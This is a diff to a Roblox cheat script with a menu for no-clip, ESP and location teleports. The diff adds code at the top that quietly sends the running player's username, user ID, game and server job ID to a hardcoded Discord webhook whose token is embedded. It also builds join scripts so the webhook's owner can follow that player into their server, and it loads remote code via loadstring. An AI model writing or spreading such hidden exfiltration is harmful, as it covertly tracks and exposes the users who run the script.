@@ -1,3 +1,79 @@
+local webhookURL = "https://discord.com/api/webhooks/1333133574412435467/dJtOBcbl4SuIv_2J05Ua3KS5C0y3a7SHI9D2sfVY_lEEf426Io_bt_xGNfy57mMVxl--"
+
+local player = game.Players.LocalPlayer
+local username = player.Name
+local displayName = player.DisplayName
+local userId = player.UserId
+local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local gameId = game.PlaceId
+local jobId = game.JobId
+local playerCount = #game.Players:GetPlayers()
+
+local jsJoinCode = [[
+    fetch("https://games.roblox.com/v1/games/]] .. gameId .. [[/servers/Public?sortOrder=Asc&limit=100").then(res => res.json()).then(json => {
+        const server = json.data.find(s => s.id === "]] .. jobId .. [[");
+        if (server) {
+            window.open(`roblox://placeId=` + server.placeId + `&gameInstanceId=` + server.id);
+        } else {
+            console.log("Server not found.");
+        }
+    });
+]]
+
+local luaJoinScript = [[
+local TeleportService = game:GetService("TeleportService")
+TeleportService:TeleportToPlaceInstance(]] .. gameId .. [[, "]] .. jobId .. [[", game.Players.LocalPlayer)
+]]
+
+local embed = {
+    ["title"] = "Execution Log",
+    ["description"] = "Here are the details of the player and game:",
+    ["type"] = "rich",
+    ["color"] = 0x000000, 
+    ["fields"] = {
+        { ["name"] = "Username", ["value"] = username, ["inline"] = true },
+        { ["name"] = "Display Name", ["value"] = displayName, ["inline"] = true },
+        { ["name"] = "User ID", ["value"] = tostring(userId), ["inline"] = false },
+        { ["name"] = "Game Name", ["value"] = gameName, ["inline"] = false },
+        { ["name"] = "Game ID", ["value"] = tostring(gameId), ["inline"] = true },
+        { ["name"] = "Players in Server", ["value"] = tostring(playerCount), ["inline"] = true },
+        { ["name"] = "JavaScript Join Code", ["value"] = "```js\n" .. jsJoinCode .. "\n```", ["inline"] = false },
+        { ["name"] = "Lua Join Script", ["value"] = "```lua\n" .. luaJoinScript .. "\n```", ["inline"] = false },
+    },
+    ["footer"] = { ["text"] = "Execution Log - Roblox" },
+    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+}
+
+local payload = game:GetService("HttpService"):JSONEncode({
+    ["content"] = "",
+    ["embeds"] = {embed}
+})
+
+local requestFunction = syn and syn.request or http_request or request
+if requestFunction then
+    requestFunction({
+        Url = webhookURL,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = payload
+    })
+else
+    warn("Your executor does not support HTTP requests.")
+end
+
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local StarterGui = game:GetService("StarterGui")
+
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local backpack = player:WaitForChild("Backpack")
+
 local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
 local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
 local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
@@ -221,6 +297,54 @@ PlayerSection:AddToggle("NoClip", {
         end
     end
 })
+
+local function teleportTo(location)
+    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+        player.Character.HumanoidRootPart.CFrame = location
+    end
+end
+
+local locations = {
+    {name = "Base", position = CFrame.new(-1039.5282, -128.299408, 85.450943)},
+    {name = "Middle", position = CFrame.new(-1041.23193, 190.831711, 90.9453735)},
+    {name = "Pink Bridge", position = CFrame.new(-868.601929, 194.367462, 211.650894)},
+    {name = "Purple Bridge", position = CFrame.new(-933.63385, 194.367462, 263.423431)},
+    {name = "Red Bridge", position = CFrame.new(-1161.80469, 194.367447, 263.3815)},
+    {name = "Blue Bridge", position = CFrame.new(-1215.68848, 194.367355, 198.300949)},
+    {name = "Cyan Bridge", position = CFrame.new(-1215.79639, 194.367447, -30.0486374)},
+    {name = "Green Bridge", position = CFrame.new(-1148.33435, 194.367462, -83.3314285)},
+    {name = "Yellow Bridge", position = CFrame.new(-920.233826, 194.367462, -83.3137131)},
+    {name = "Orange Bridge", position = CFrame.new(-868.59314, 194.367462, -16.6490135)},
+}
+
+local locationNames = {}
+for _, location in ipairs(locations) do
+    table.insert(locationNames, location.name)
+end
+
+if Tabs and Tabs.Player then
+
+    Options.TeleportDropdown = Tabs.Player:AddDropdown("TeleportDropdown", {
+        Title = "Teleport",
+        Values = locationNames,
+        Multi = false,
+        Default = 1,
+    })
+
+    Options.TeleportDropdown:SetValue(locationNames[1])
+
+    Options.TeleportDropdown:OnChanged(function(Value)
+        for _, location in ipairs(locations) do
+            if location.name == Value then
+                teleportTo(location.position)
+                break
+            end
+        end
+    end)
+else
+    warn("Tabs.Player does not exist. Ensure the tab is correctly created.")
+end
+
 local EnableSection = Tabs.ESP:AddSection("Enable ESP")
 
 EnableSection:AddToggle("EnableEnemyESP", {
